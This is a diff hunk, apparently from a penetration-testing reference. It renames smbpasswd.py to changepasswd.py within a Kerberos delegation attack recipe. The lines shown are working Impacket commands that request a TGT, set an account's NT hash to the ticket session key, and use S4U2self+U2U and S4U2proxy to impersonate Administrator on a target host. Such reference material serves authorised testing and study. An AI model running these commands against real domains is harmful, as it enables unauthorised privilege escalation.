@@ -205,7 +205,7 @@ getTGT.py -hashes :$(pypykatz crypto nt 'SomePassword') 'domain'/'controlledacco
 describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'
 
 # Change the controlledaccountwithoutSPN's NT hash with the TGT session key
-smbpasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'
+changepasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'
 
 # Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
 KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'
